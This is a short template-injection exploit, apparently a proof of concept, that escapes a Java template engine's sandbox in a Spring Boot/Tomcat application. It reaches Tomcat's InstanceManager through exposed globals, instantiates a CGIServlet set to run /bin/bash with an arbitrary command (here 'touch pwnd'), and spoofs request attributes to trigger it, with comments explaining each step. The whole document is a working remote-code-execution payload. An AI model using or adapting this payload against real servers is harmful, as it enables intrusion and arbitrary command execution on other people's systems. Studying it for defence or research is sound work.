{#
   we have a few exposed globals to escape the sandbox with -- request, response, and beans
#}
{% set parent = beans.get("dispatcherServlet").getWebApplicationContext().getWebServer().getTomcat().getHost().findChild("") %}
{% set ctx = request.getServletContext() %}


{#
   we can use the InstanceManager to instantiate anything we want :) let's set up a CGIServlet to run executables
#}
{% set cl = ctx.getClassLoader() %}
{% set im = ctx.getAttribute("org.apache.tomcat.InstanceManager") %}
{% set srv = im.newInstance("org.apache.catalina.servlets.CGIServlet", cl) %}



{#
   use a StandardWrapper instance to set config params, this allows us to change the cgi executable
#}
{% set sw = im.newInstance("org.apache.catalina.core.StandardWrapper", cl) %}
{{ sw.setParent(parent) }}
{{ sw.addInitParameter("cgiMethods", "*") }}
{{ sw.addInitParameter("executable", "/bin/bash") }}
{{ sw.addInitParameter("executable-arg-1", "-c") }}
{{ sw.addInitParameter("executable-arg-2", "touch pwnd") }}


{#
   here we spoof the request URI so that CGIServlet thinks the file exists (point it to /test.css)
#}
{{ request.setAttribute("javax.servlet.include.request_uri", "1") }}
{{ request.setAttribute("javax.servlet.include.context_path", "") }}
{{ request.setAttribute("javax.servlet.include.servlet_path", "") }}
{{ request.setAttribute("javax.servlet.include.path_info", "/test.css") }}


{#
    finish setup and run the servlet with our request/response objects
#}
{{ srv.init(sw) }}
{{ srv.service(request, response) }}
